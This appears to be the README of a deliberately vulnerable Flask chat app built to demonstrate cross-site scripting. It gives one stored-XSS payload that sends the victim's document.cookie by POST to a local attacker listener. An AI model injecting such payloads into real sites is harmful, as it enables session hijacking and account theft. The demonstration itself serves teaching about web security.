Chat WebApp with Flask

Building an vulnerable chat web app to demostrate XSS attacks.


Attacker's injection: <script>$.ajax({ url : 'https://127.0.0.1:5001/listen', type : 'POST', data : { 'cookie' : document.cookie }, success : function(response) {}, error : function(error) {} })</script>